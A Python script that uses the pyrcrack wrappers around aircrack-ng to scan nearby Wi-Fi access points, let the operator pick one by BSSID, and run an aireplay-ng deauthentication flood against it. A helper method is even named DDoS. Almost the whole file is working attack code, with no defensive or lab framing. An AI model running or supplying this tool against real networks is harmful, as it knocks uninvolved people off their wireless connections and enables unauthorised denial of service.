import asyncio

import pyrcrack
from contextlib import suppress
from rich.console import Console
from rich.prompt import Prompt
import os
from wifi_class import Aireplay

CONSOLE = Console()
CONSOLE.clear()
CONSOLE.show_cursor(False)

async def scan_for_targets():
    """Scan for targets, return json."""
    console = Console()
    console.clear()
    console.show_cursor(False)
    airmon = pyrcrack.AirmonNg()
    
    # Generate pretty prompt
    interface = Prompt.ask(
        'Select an interface',
        choices=[a.asdict()['interface'] for a in await airmon.interfaces]
        )
    try:
        async with airmon(interface) as mon:
            async with pyrcrack.AirodumpNg() as pdump:
                async for result in pdump(mon.monitor_interface):
                    console.clear()
                    console.print(result.table)
                    await asyncio.sleep(2)
    except KeyboardInterrupt:
        exit()
        

async def attack(apo):
    ###Run aireplay deauth attack.###
    airmon = pyrcrack.AirmonNg()
    interfaces = await airmon.interfaces
    CONSOLE.print(f"Starting airmon-ng with channel {apo.channel}")
    async with airmon(interfaces[0].interface) as mon:
        async with pyrcrack.AireplayNg() as aireplay:
            CONSOLE.print(f"Starting aireplay on {mon.monitor_interface} for {apo.bssid}")
            await aireplay.run(mon.monitor_interface, deauth=10, D=True,b=apo.bssid)
            while True:
                CONSOLE.print(aireplay.meta)
                await asyncio.sleep(2)
                
async def attack_air(ap, interface):
    aire = Aireplay(ap)
    await aire.DDoS(interface)

async def deauth():
    """Scan for targets, return json."""
    airmon = pyrcrack.AirmonNg()
    interfaces = await airmon.interfaces
    i = 1
    try:
        async with airmon(interfaces[0].interface) as mon:
            
            async with pyrcrack.AirodumpNg() as pdump:
                async for result in pdump(mon.monitor_interface):
                    
                    CONSOLE.print(result.table)
                    with suppress(KeyError):
                        print("Seleccione una interface:")
                        for r in result:
                            print("("+str(i)+")"+r.bssid)
                            i+=1
                        ap = int(Prompt.ask())
                        ap -=1
                        CONSOLE.print(f'AP seleccionado: {result[ap].bssid}')
                        ap = result[ap]
                        
                        break
                    await asyncio.sleep(3)
                await attack_air(ap, 'wlan0mon') 
    except KeyError:
        os.system('sudo airmon-ng stop wlan0mon')
        #asyncio.run(deauth())
        exit()
asyncio.run(deauth())
